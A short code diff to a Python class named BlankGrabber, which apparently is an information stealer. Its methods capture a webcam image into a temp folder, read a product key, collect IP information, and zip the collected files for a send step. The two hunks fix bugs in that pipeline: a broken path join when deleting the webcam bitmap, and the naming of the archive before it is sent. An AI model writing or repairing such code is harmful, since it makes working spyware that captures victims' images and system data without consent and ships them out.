@@ -189,7 +189,7 @@ class BlankGrabber:
             return
         with Image.open(os.path.join(sys._MEIPASS, "Webcam.bmp")) as img:
             img.save(os.path.join(self.tempfolder, "Webcam.png"), "png")
-        os.remove(os.path.join(sys._MEIPASS + "Webcam.bmp"))
+        os.remove(os.path.join(sys._MEIPASS, "Webcam.bmp"))
         os.remove(os.path.join(sys._MEIPASS, "cm.bam"))
 
     def getPKey(self):
@@ -480,7 +480,7 @@ class BlankGrabber:
         self.ipinfo = data
 
     def zip(self):
-        shutil.make_archive(self.archive[:-3], "zip", self.tempfolder)
+        shutil.make_archive(self.archive.rsplit(".", 1)[0], "zip", self.tempfolder)
 
     def send(self):
         self.zip()
